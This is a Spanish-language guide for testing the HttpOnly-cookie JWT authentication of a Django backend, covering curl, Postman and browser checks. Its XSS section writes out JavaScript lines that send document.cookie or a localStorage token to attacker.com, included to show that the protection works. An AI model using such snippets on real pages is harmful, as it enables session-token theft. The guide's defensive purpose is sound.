"""
Testing de HttpOnly Cookies Implementation - Nurax Backend

Guía completa para verificar que la implementación de HttpOnly cookies funciona correctamente.
"""

# ============================================================================
# 1. VERIFICACIÓN BÁSICA (Sin servidor corriendo)
# ============================================================================

# ✅ Django System Check
cd nurax_backend
python manage.py check

# Salida esperada:
# System check identified no issues (0 silenced).
# ✅ Esto confirma que toda la configuración está correcta


# ============================================================================
# 2. TEST CON DOCKER (Recomendado)
# ============================================================================

# Iniciar todos los servicios
docker-compose up --build

# Esperar a que el backend esté listo (verás "Starting development server at http://0.0.0.0:8000/")
# Luego en otra terminal, prueba el login


# ============================================================================
# 3. TEST CON CURL (Verificar cookies)
# ============================================================================

# A. Login y capturar cookies
curl -i -c cookies.txt \
  -X POST http://localhost:8000/api/auth/login/ \
  -H "Content-Type: application/json" \
  -d '{"email":"test@example.com","password":"password"}' 

# Salida esperada (headers):
# HTTP/1.1 200 OK
# Set-Cookie: access_token=JWT_VALUE_HERE; HttpOnly; Path=/; SameSite=Strict; Secure; Max-Age=28800
# Set-Cookie: refresh_token=REFRESH_JWT_HERE; HttpOnly; Path=/; SameSite=Strict; Secure; Max-Age=2592000

# Body esperado:
# {
#   "message": "Login exitoso",
#   "user": {
#     "id": 1,
#     "email": "test@example.com",
#     "username": "username",
#     "name": "User Name",
#     "role": "owner",
#     "avatar_url": "https://..."
#   }
# }

# Ver las cookies guardadas
cat cookies.txt

# Salida esperada (del archivo cookies.txt):
# .localhost.local    TRUE    /    TRUE    1713000000    access_token    eyJ0eXAiOiJKV1QiLCJhbGc...
# .localhost.local    TRUE    /    TRUE    1715600000    refresh_token   eyJ0eXAiOiJKV1QiLCJhbGc...


# B. Usar cookies en siguiente request (auto-enviadas)
curl -i -b cookies.txt \
  -X GET http://localhost:8000/api/v1/accounts/users/me/ \
  -H "Content-Type: application/json"

# Salida esperada:
# HTTP/1.1 200 OK
# {
#   "id": 1,
#   "username": "username",
#   "email": "test@example.com",
#   "name": "User Name",
#   ...
# }
# ✅ Autenticado exitosamente sin pasar token en header


# C. Logout (limpiar cookies)
curl -i -b cookies.txt \
  -X POST http://localhost:8000/api/auth/logout/ \
  -H "Content-Type: application/json"

# Salida esperada (headers):
# HTTP/1.1 200 OK
# Set-Cookie: access_token=; Path=/; HttpOnly; SameSite=Strict; Secure; Max-Age=0
# Set-Cookie: refresh_token=; Path=/; HttpOnly; SameSite=Strict; Secure; Max-Age=0
#
# Body:
# {"message": "Sesión cerrada correctamente"}


# ============================================================================
# 4. TEST CON POSTMAN / Insomnia
# ============================================================================

/*
Paso 1: POST Login
- URL: http://localhost:8000/api/auth/login/
- Body (JSON):
  {
    "email": "test@example.com",
    "password": "password"
  }
- Result: Recibirás SET-COOKIE headers con access_token y refresh_token
- En Postman, verifica: Environment Variables > Cookies tab

Paso 2: GET Protegido
- URL: http://localhost:8000/api/v1/accounts/users/me/
- Headers: Ninguno necesario (cookies se envían automáticamente)
- Result: 200 OK con datos del usuario
- ✅ Las cookies se enviaron automáticamente

Paso 3: Logout
- URL: http://localhost:8000/api/auth/logout/
- Result: Cookies se limpian (Max-Age=0)
*/


# ============================================================================
# 5. VERIFICACIÓN EN NAVEGADOR (DevTools)
# ============================================================================

/*
1. Abrir http://localhost:5173 (frontend)
2. Login con tus credenciales
3. Abrir DevTools: F12 → Application → Cookies
4. Buscar "access_token" y "refresh_token"
5. ✅ Verificar que tienen flag "HttpOnly" checkado
6. ✅ Verificar que "Secure" está checkado (en producción/HTTPS)
7. ✅ Verificar que "SameSite=Strict" está configurado
8. ❌ NO deberías poder ver el valor del token en DevTools

Try en Console:
  document.cookie
  // Debe retornar vacío "" (HttpOnly cookies no aparecen)
*/


# ============================================================================
# 6. TEST XSS INJECTION (Verificar protección)
# ============================================================================

/*
Simular un ataque XSS:

En Console del navegador:
  const req = fetch('https://attacker.com?token=' + document.cookie)
  // 🛡️ Resultado: Se envía petition pero document.cookie está vacío
  // ✅ Token NO fue robado aunque haya XSS

Con localStorage (vulnerable - ANTES):
  const req = fetch('https://attacker.com?token=' + localStorage.getItem('access_token'))
  // ❌ Resultado: Token completo se envía a atacante
  // Vulnerabilidad XSS crítica

Con HttpOnly Cookies (seguro - AHORA):
  const req = fetch('https://attacker.com?token=' + document.cookie)
  // ✅ Resultado: document.cookie vacío, token NO robado
  // 🛡️ Protección XSS funcionando
*/


# ============================================================================
# 7. TEST DE REFRESH TOKEN
# ============================================================================

# A. Login (obtener tokens)
curl -i -c cookies.txt \
  -X POST http://localhost:8000/api/auth/login/ \
  -H "Content-Type: application/json" \
  -d '{"email":"test@example.com","password":"password"}'

# B. Esperar a que expire (simular con un delay o aguardar)
# El access_token expira en 8 horas por defecto

# C. Hacer request con refresh
curl -i -b cookies.txt \
  -X POST http://localhost:8000/api/auth/refresh/ \
  -H "Content-Type: application/json"

# Salida esperada:
# HTTP/1.1 200 OK
# Set-Cookie: access_token=NEW_JWT_DIFFERENT_VALUE; HttpOnly; ...
# {"message": "Token refrescado exitosamente"}
# ✅ Nuevo access_token en cookie, transparente para frontend


# ============================================================================
# 8. CHECKLIST FINAL DE VERIFICACIÓN
# ============================================================================

# ✅ Django check sin errores
# ✅ Login retorna 200 OK + SET-COOKIE headers
# ✅ Cookies tienen flags: HttpOnly=TRUE, Secure=TRUE (producción)
# ✅ Cookies tienen SameSite=Strict
# ✅ GET a endpoint protegido funciona sin pasar token en header
# ✅ document.cookie en navegador está vacío (HttpOnly oculta)
# ✅ XSS injection no puede robar token
# ✅ Logout limpia cookies (Max-Age=0)
# ✅ Refresh token genera new access_token

# SI TODO ESTO FUNCIONA: 🎉 IMPLEMENTACIÓN EXITOSA


# ============================================================================
# 9. TROUBLESHOOTING
# ============================================================================

# Problema: "Token inválido o expirado"
# Solución: Asegurate que el usuario existe en BD
# - Django shell: from accounts.models import User; User.objects.create_user(...)

# Problema: Cookies no aparecen en Set-Cookie
# Solución: 
# - En desarrollo, Secure=False (porque no es HTTPS)
# - Ver settings.py DEBUG=True → SESSION_COOKIE_SECURE = False
# - En producción, SESSION_COOKIE_SECURE = True (HTTPS requerido)

# Problema: "CORS error" 
# Solución:
# - Verificar CORS_ALLOWED_ORIGINS en settings.py
# - Verificar CORS_ALLOW_CREDENTIALS = True
# - Frontend debe enviar credentials: 'include' (ya hecho)

# Problema: Frontend sigue viendo credenciales invalidas
# Solución:
# - Limpiar cache/cookies del navegador
# - Hacer login de nuevo
# - Verificar que auth.ts tiene credentials: 'include'
